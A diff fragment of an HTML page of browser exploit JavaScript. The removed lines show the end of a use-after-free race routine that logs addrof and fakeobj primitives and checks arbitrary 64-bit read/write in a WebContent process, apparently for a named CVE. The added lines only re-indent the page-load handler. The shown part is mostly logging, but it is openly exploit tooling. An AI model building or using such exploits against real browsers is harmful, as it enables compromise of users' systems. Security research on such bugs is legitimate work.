-            ds
-        };
-        if (ds.ok) {
-            window.lastExploitState.read64 = ds.read64;
-            window.lastExploitState.write64 = ds.write64;
-            window.lastExploitState.keepAlive = ds.keepAlive;
-        }
-
-        log(`UAF won at attempt ${k}; reclaimed arrays=${reclaimed.length}`, "ok");
-        log(`addrof(boxedArray)=${hex(addrBoxed)}`, "ok");
-        log(`addrof(rootArray)=${hex(addrRoot)}`, "ok");
-        log(`fakeobj(addrof(boxedArray)) self type=${Object.prototype.toString.call(fakeSelf)}`, "ok");
-
-        log(`DS scribble stage=${ds.report.stage}`, ds.ok ? "ok" : "fail");
-        log(`DS scribble attempts=${ds.report.attempts}; scribble=${hex(ds.report.scribbleAddr)}`, ds.ok ? "ok" : "warn");
-        if (ds.report.vectorRaw) log(`typed-array vector raw=${hex(ds.report.vectorRaw)}`, ds.ok ? "ok" : "warn");
-
-        if (ds.ok) {
-            log(`DS scribble read64/write64 VERIFIED; proofs=${ds.report.proofs}; backing=${hex(ds.report.backingPtr)}; secondary=${hex(ds.report.secondaryBackingPtr)}`, "ok");
-            setStatus("verified WebContent read64/write64");
-        } else {
-            log(`DS scribble failed: ${ds.report.reason}`, "fail");
-            setStatus("addrof/fakeobj only; DS R/W not verified");
-        }
-        break;
-    }
-
-    if (!success) {
-        log("Stage 1 failed: race not won after max attempts", "fail");
-        setStatus("failed to win UAF race");
-    }
-
-    runner.disabled = false;
-    window.__cve43529Running = false;
-}
-
-window.addEventListener("load", () => {
-    setStatus("ready");
-    log("Ready; press Run now to start the primitive test", "warn");
-});
-</script>
+        window.addEventListener("load", () => {
+            setStatus("ready");
+            log("Ready; press Run now to start the primitive test", "warn");
+        });
+    </script>
 </body>
+
 </html>
